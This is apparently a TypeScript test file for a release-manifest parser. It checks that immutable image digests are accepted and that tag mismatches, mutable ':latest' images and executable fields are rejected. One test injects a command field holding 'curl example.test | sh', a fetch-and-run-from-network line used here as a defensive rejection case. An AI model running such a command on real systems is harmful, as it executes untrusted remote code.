import { parsePlatformReleaseManifest } from './platform-release-manifest';

function manifest(version = '0.2.0') {
  const image = (component: string, letter: string) => ({
    name: `ghcr.io/kudrle01/initpad-${component}`,
    digest: `sha256:${letter.repeat(64)}`,
    immutableReference: `ghcr.io/kudrle01/initpad-${component}@sha256:${letter.repeat(64)}`,
    platforms: ['linux/amd64', 'linux/arm64'],
  });
  return {
    schemaVersion: 1,
    component: 'initpad-platform',
    version,
    source: {
      repository: 'https://github.com/kudrle01/initpad',
      tag: `initpad-v${version}`,
      commit: 'd'.repeat(40),
    },
    images: {
      api: image('api', 'a'),
      web: image('web', 'b'),
      supervisor: image('supervisor', 'c'),
    },
    compose: { file: 'initpad-release.override.yml', sha256: 'e'.repeat(64) },
    database: {
      migrationMode: 'expand-contract',
      rollback: 'image-compatible',
      backupRequired: true,
    },
  };
}

describe('platform release manifest', () => {
  it('accepts an exact immutable release contract', () => {
    expect(
      parsePlatformReleaseManifest(manifest(), 'kudrle01/initpad', 'initpad-v0.2.0').version,
    ).toBe('0.2.0');
  });

  it('rejects tag mismatch, mutable images and executable fields', () => {
    expect(() =>
      parsePlatformReleaseManifest(manifest(), 'kudrle01/initpad', 'initpad-v0.3.0'),
    ).toThrow('invalid');
    const mutable = manifest();
    mutable.images.api.immutableReference = 'ghcr.io/kudrle01/initpad-api:latest';
    expect(() =>
      parsePlatformReleaseManifest(mutable, 'kudrle01/initpad', 'initpad-v0.2.0'),
    ).toThrow('invalid');
    expect(() =>
      parsePlatformReleaseManifest(
        { ...manifest(), command: ['sh', '-c', 'curl example.test | sh'] },
        'kudrle01/initpad',
        'initpad-v0.2.0',
      ),
    ).toThrow('invalid');
  });
});
